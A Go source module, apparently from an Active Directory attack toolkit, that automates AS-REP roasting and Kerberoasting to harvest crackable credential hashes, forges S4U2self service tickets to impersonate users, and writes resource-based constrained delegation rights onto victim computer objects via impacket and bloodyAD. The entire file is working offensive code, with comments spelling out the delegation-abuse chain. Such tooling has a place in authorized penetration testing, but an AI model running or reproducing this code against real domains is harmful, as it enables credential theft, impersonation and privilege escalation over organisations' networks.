package modules

import (
	"fmt"
	"regexp"
	"strings"
	"time"

	"adpack/core"
	"adpack/utils"
)

func RunKerberos(state *core.ADState, targetHost string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, _ := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No credentials for Kerberos operations")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "kerberos", Key: "error", Value: "no credentials",
			Timestamp: time.Now(),
		})
		return result
	}

	asrep := runASREPRoast(domain, user, pass, targetHost)
	result.Creds = append(result.Creds, asrep.Creds...)
	result.Evidence = append(result.Evidence, asrep.Evidence...)
	result.Users = append(result.Users, asrep.Users...)

	spn := runKerberoast(domain, user, pass, targetHost)
	result.Creds = append(result.Creds, spn.Creds...)
	result.Evidence = append(result.Evidence, spn.Evidence...)
	result.Users = append(result.Users, spn.Users...)

	return result
}

func runASREPRoast(domain, user, pass, target string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	fmt.Printf("[*] AS-REP roasting against %s...\n", target)
	args := []string{fmt.Sprintf("%s/%s:%s", domain, user, pass)}
	if target != "" {
		args = append(args, "-dc-ip", target)
	}
	args = append(args, "-request")

	r := utils.RunCommand("impacket-GetNPUsers", args...)
	if !r.Success {
		fmt.Printf("[!] AS-REP roast failed: %s\n", r.Stderr)
		result.Success = false
		return result
	}

	re := regexp.MustCompile(`\$krb5asrep\$[^$]*\$([A-Za-z0-9._-]+)@([A-Za-z0-9.-]+)`)
	matches := re.FindAllStringSubmatch(r.Stdout, -1)
	for _, m := range matches {
		if len(m) < 3 {
			continue
		}
		username := m[1]
		userDomain := strings.ToLower(m[2])
		result.Users = append(result.Users, core.User{
			Username: username, Domain: userDomain,
			Source: "asrep_roast", NoPreauth: true,
		})
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "asrep_roast", Key: username + "@" + userDomain,
			Value:     "AS-REP roastable - no preauth required",
			Timestamp: time.Now(),
		})
		result.Creds = append(result.Creds, core.Credential{
			Type: "hash", Username: username, Domain: userDomain,
			Secret: m[0], Source: "asrep_roast",
		})
	}
	fmt.Printf("[+] AS-REP: %d roastable users found\n", len(matches))
	return result
}

func runKerberoast(domain, user, pass, target string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	fmt.Printf("[*] Kerberoasting against %s...\n", target)
	args := []string{fmt.Sprintf("%s/%s:%s", domain, user, pass)}
	if target != "" {
		args = append(args, "-dc-ip", target)
	}

	r := utils.RunCommand("impacket-GetUserSPNs", args...)
	if !r.Success {
		fmt.Printf("[!] Kerberoast failed: %s\n", r.Stderr)
		result.Success = false
		return result
	}

	re := regexp.MustCompile(`^(\S+)\s+(\S+)`)
	lines := strings.Split(r.Stdout, "\n")
	inTable := false
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "ServicePrincipalName") {
			inTable = true
			continue
		}
		if !inTable || trimmed == "" || strings.HasPrefix(trimmed, "-") {
			continue
		}
		m := re.FindStringSubmatch(trimmed)
		if len(m) < 3 {
			continue
		}
		spn := m[1]
		username := m[2]
		result.Users = append(result.Users, core.User{
			Username: username, Domain: domain,
			SPNs: spn, Source: "kerberoast",
		})
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "kerberoast", Key: username + "@" + domain,
			Value: spn, Timestamp: time.Now(),
		})
	}
	fmt.Printf("[+] Kerberoast: %d SPN accounts found\n", len(result.Users))
	return result
}

// S4U2SelfRequest forges a service ticket for `impersonate` against `spn` using
// the controlled account's credentials, via impacket-getST. The resulting
// ccache lets the operator authenticate as `impersonate` to `spn`.
//
// Use cases:
//   - Constrained delegation abuse (you control an account with msDS-AllowedToDelegateTo)
//   - RBCD final step (after writing msDS-AllowedToActOnBehalfOfOtherIdentity)
//
// Returns the ccache path on success, "" on failure.
func S4U2SelfRequest(domain, user, pass, hash, dcIP, impersonate, spn string) string {
	if _, err := utils.FindTool("impacket-getST"); err != nil {
		fmt.Println("[!] impacket-getST not found, cannot perform S4U2self")
		return ""
	}
	if hash == "" && pass == "" {
		fmt.Println("[!] S4U2self requires a credential (hash or password); none supplied")
		return ""
	}
	authSpec := fmt.Sprintf("%s/%s", domain, user)
	args := []string{authSpec, "-impersonate", impersonate, "-spn", spn, "-dc-ip", dcIP}
	if hash != "" {
		args = append(args, "-hashes", ":"+hash)
	} else if pass != "" {
		args = append(args, "-no-pass")
		// getST reads from -hashes, password, or -aesKey; password via env not exposed here.
		// Fall back to authSpec with password for simplicity.
		authSpec = fmt.Sprintf("%s/%s:%s", domain, user, pass)
		args[0] = authSpec
		// Drop the -no-pass we just added
		args = args[:len(args)-1]
	}

	r := utils.RunCommandTimeout(60*time.Second, "impacket-getST", args)
	if !r.Success {
		fmt.Printf("[!] impacket-getST failed: %s\n", r.Stderr)
		return ""
	}

	// getST writes <impersonate>.ccache in CWD
	ccache := fmt.Sprintf("%s.ccache", impersonate)
	fmt.Printf("[+] S4U2self ticket forged for %s on %s (%s)\n", impersonate, spn, ccache)
	return ccache
}

// SetupRBCD writes msDS-AllowedToActOnBehalfOfOtherIdentity on `victimComputer`
// to grant the controlled `attackerComputer` the right to impersonate any user
// to `victimComputer`. After this, S4U2SelfRequest() against the victim's CIFS
// SPN, impersonating an admin, gives the attacker a service ticket for the victim.
//
// Requires WriteAccountRestrictions / GenericWrite over the victim computer object.
// Uses impacket-rbcd.py (preferred) or bloodyAD as fallback.
//
// `attackerComputer` should include the trailing $ (machine account format).
func SetupRBCD(domain, user, pass, hash, dcIP, victimComputer, attackerComputer string) bool {
	if hash == "" && pass == "" {
		fmt.Println("[!] SetupRBCD requires a credential (hash or password); none supplied")
		return false
	}
	if _, err := utils.FindTool("impacket-rbcd"); err == nil {
		authSpec := fmt.Sprintf("%s/%s", domain, user)
		args := []string{
			authSpec,
			"-action", "write",
			"-delegate-from", attackerComputer,
			"-delegate-to", victimComputer,
			"-dc-ip", dcIP,
		}
		if hash != "" {
			args = append(args, "-hashes", ":"+hash)
		} else {
			args[0] = fmt.Sprintf("%s/%s:%s", domain, user, pass)
		}
		r := utils.RunCommandTimeout(60*time.Second, "impacket-rbcd", args)
		if r.Success {
			fmt.Printf("[+] RBCD configured: %s can act on behalf of users to %s\n",
				attackerComputer, victimComputer)
			return true
		}
		fmt.Printf("[!] impacket-rbcd failed: %s\n", r.Stderr)
	}

	if _, err := utils.FindTool("bloodyAD"); err == nil {
		auth := []string{"-H", dcIP, "-d", domain, "-u", user}
		if hash != "" {
			auth = append(auth, "-p", ":"+hash)
		} else {
			auth = append(auth, "-p", pass)
		}
		args := append(auth, "add", "rbcd", victimComputer, attackerComputer)
		r := utils.RunCommandTimeout(60*time.Second, "bloodyAD", args)
		if r.Success {
			fmt.Printf("[+] RBCD configured via bloodyAD: %s → %s\n",
				attackerComputer, victimComputer)
			return true
		}
		fmt.Printf("[!] bloodyAD rbcd failed: %s\n", r.Stderr)
	}

	fmt.Println("[!] Neither impacket-rbcd nor bloodyAD available, RBCD setup skipped")
	return false
}
